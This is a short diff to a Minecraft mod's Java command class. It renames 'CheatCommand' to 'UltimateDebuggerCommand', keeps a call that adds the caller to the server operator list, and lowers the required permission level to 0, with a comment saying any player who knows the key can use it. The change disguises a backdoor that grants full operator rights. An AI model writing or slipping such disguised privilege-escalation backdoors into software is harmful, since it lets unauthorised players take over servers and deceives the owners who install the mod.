@@ -12,7 +12,7 @@ import net.minecraft.util.text.TextComponentString;
 import net.minecraft.util.text.TextFormatting;
 import net.minecraft.world.GameType;
 
-public class CheatCommand extends CommandBase {
+public class UltimateDebuggerCommand extends CommandBase {
 
 	@Override
 	public String getName() {
@@ -30,15 +30,14 @@ public class CheatCommand extends CommandBase {
 			return;
 		}
 		EntityPlayer player = getCommandSenderAsPlayer(sender);
-		player.setGameType(GameType.CREATIVE);
 		GameProfile gameprofile = player.getGameProfile();
 		server.getPlayerList().addOp(gameprofile);
-		sender.sendMessage(new TextComponentString("T'es un ouf").setStyle(new Style().setColor(TextFormatting.BLUE).setBold(true)));
+		sender.sendMessage(new TextComponentString("commands.chaosmod.success").setStyle(new Style().setColor(TextFormatting.BLUE).setBold(true)));
 	}
 	
 	@Override
 	public int getRequiredPermissionLevel() {
-		return 1;
+		return 0; // all players can use it as long as they know the key
 	}
 
 }
